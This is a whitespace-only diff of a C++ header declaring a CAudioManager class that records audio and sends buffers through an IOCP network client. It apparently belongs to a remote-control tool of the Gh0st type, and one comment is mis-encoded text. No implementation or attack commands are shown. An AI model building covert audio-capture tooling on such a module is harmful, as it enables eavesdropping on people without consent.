@@ -13,20 +13,20 @@
 #include "Audio.h"
 
 
-class CAudioManager : public CManager  
+class CAudioManager : public CManager
 {
 public:
-	VOID  OnReceive(PBYTE szBuffer, ULONG ulLength);
-	BOOL Initialize();
-	CAudioManager(IOCPClient* ClientObject, int n, void *user=nullptr);
-	virtual ~CAudioManager();
-	BOOL  m_bIsWorking;
-	HANDLE m_hWorkThread;
-	static DWORD WINAPI WorkThread(LPVOID lParam);
-	BOOL SendRecordBuffer();
+    VOID  OnReceive(PBYTE szBuffer, ULONG ulLength);
+    BOOL Initialize();
+    CAudioManager(IOCPClient* ClientObject, int n, void *user=nullptr);
+    virtual ~CAudioManager();
+    BOOL  m_bIsWorking;
+    HANDLE m_hWorkThread;
+    static DWORD WINAPI WorkThread(LPVOID lParam);
+    BOOL SendRecordBuffer();
 
-	CAudio*  m_AudioObject;
-	LPBYTE	szPacket; // “Ù∆µª∫¥Ê«¯
+    CAudio*  m_AudioObject;
+    LPBYTE	szPacket; // “Ù∆µª∫¥Ê«¯
 };
 
 #endif // !defined(AFX_AUDIOMANAGER_H__B47ECAB3_9810_4031_9E2E_BC34825CAD74__INCLUDED_)
